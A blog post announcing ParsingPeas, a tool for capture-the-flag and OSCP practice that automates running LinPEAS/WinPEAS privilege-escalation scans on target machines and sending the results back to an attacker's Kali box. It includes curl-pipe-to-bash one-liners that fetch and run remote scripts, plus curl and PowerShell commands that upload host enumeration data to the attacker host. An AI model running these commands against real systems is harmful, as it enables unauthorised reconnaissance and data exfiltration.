---
layout: post
title: "ParsingPeas: Automating LinPEAS Collection"
date: 2026-02-02 00:05:00 +0200
categories:
  - tools
  - automation
tags:
  - linpeas
  - enumeration
  - oscp
  - ctf
  - python
featured_image: /assets/images/parsingpeas-logo.png
---

I got tired of manually transferring LinPEAS output between machines, so I built [ParsingPeas](https://github.com/YuvalMil/ParsingPeas). One command on the target, instant HTML report on your Kali box.

## The Problem

Running LinPEAS on multiple HTB boxes means:
- Setting up HTTP servers
- Copy-pasting thousands of lines of colored output
- Losing track of which findings belong to which machine
- Re-running scans because you forgot to save the output

It's tedious as hell.

## The Solution

On target:
```bash
curl -sSL http://YOUR_KALI_IP:8000/get-script | bash
```

Done. LinPEAS runs, results automatically transfer back, HTML report generates with categorized findings.

## How It Works

**On Kali:**
```bash
git clone https://github.com/YuvalMil/ParsingPeas.git
cd ParsingPeas
./setup.sh
python3 receiver.py
```

The server:
- Hosts LinPEAS/WinPEAS binaries
- Serves wrapper scripts that handle execution and upload
- Receives scan outputs
- Parses results into categorized HTML
- Shows all reports on a dashboard

**Architecture:**
- `receiver.py` - HTTP server
- `parser.py` - Parses ANSI output, categorizes findings
- `wrapper.sh/ps1` - Runs scan, uploads results

No internet needed on the target. Everything goes through your Kali box.

## Features

**One-liner execution**
No manual chmod, wget, execute, transfer bullshit.

**HTML reports with:**
- Categorized sections (SUID, Cron, Network, Passwords, etc.)
- Preserved ANSI colors
- Jump navigation
- Full terminal view

**Multi-session support**
Run scans on multiple boxes simultaneously. Each gets its own report by hostname + timestamp.

**Sudo hang fix**
LinPEAS hangs when it hits `sudo -l` without a password. The wrapper patches this:
```bash
alias sudo='sudo -n'
export SUDO_ASKPASS=/bin/false
```

**Works offline**
Target only needs to reach your Kali box. Perfect for pivoted networks.

## Usage

### Basic
```bash
# On Kali
python3 receiver.py

# On target
curl -sSL http://10.10.14.5:8000/get-script | bash

# View at http://10.10.14.5:8000
```

### Manual (if curl fails)
```bash
# Target
curl http://10.10.14.5:8000/get-linpeas -o /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh > /tmp/out.txt

curl -X POST \
  -H "X-Hostname: $(hostname)" \
  -H "X-Scan-Type: linpeas" \
  --data-binary @/tmp/out.txt \
  http://10.10.14.5:8000/upload
```

### Parse local files
```bash
python3 parser.py /path/to/linpeas_output.txt
```

## Why I Built This

During HTB sessions, I kept losing track of which LinPEAS output belonged to which machine. Copy-pasting terminal output into Obsidian was annoying and error-prone.

Built the first version in a few hours:
- Basic HTTP server
- Upload endpoint
- File storage

Added HTML parsing:
- Regex-based section detection
- Basic categorization
- Preserved ANSI colors

Then community feedback:
- WinPEAS support
- Better sudo handling
- Multi-session dashboard

69 stars in under a week was unexpected. Apparently other people had the same annoyance.

## Technical Notes

### Parsing ANSI Output

LinPEAS uses ANSI escape codes for colors. Detecting and categorizing them:

```python
ansi_pattern = re.compile(r'\x1b\[[0-9;]*m')
red_pattern = re.compile(r'\x1b\[1;31m')  # Critical
yellow_pattern = re.compile(r'\x1b\[1;33m')  # Important

categories = {
    'SUID': ['SUID', 'SGID', 'Capabilities'],
    'Cron Jobs': ['CRON', 'crontab'],
    'Network': ['Interfaces', 'Netstat'],
    # 20+ more
}
```

### WinPEAS

Windows has different encoding and header formats:

```powershell
$output = & .\winPEASx64.exe | Out-String
Invoke-RestMethod -Uri "http://$KaliIP:8000/upload" `
  -Method POST `
  -Headers @{"X-Hostname"=$env:COMPUTERNAME; "X-Scan-Type"="winpeas"} `
  -Body $output
```

Parser detects WinPEAS headers using cyan+green ANSI patterns.

## TODO

**High priority:**
- Better WinPEAS categorization
- Search in HTML reports
- User context display (root vs standard user)

**Medium:**
- Export to JSON/CSV
- Compare two reports side-by-side
- Better filename format

**Low:**
- Dark theme
- Bookmarks
- Timeline view

## Lessons

**Build what you need**
I made this for myself. That's why it actually works.

**Simple UX matters**
The one-liner was the most appreciated feature. No one reads docs.

**Ship it**
Almost didn't publish because "not perfect yet." 69 stars proved people want it as-is.

## Links

- [GitHub](https://github.com/YuvalMil/ParsingPeas)
- [Issues](https://github.com/YuvalMil/ParsingPeas/issues)
- [PRs welcome](https://github.com/YuvalMil/ParsingPeas/pulls)

Built on [PEASS-ng](https://github.com/peass-ng/PEASS-ng) by [@carlospolop](https://github.com/carlospolop). MIT licensed.
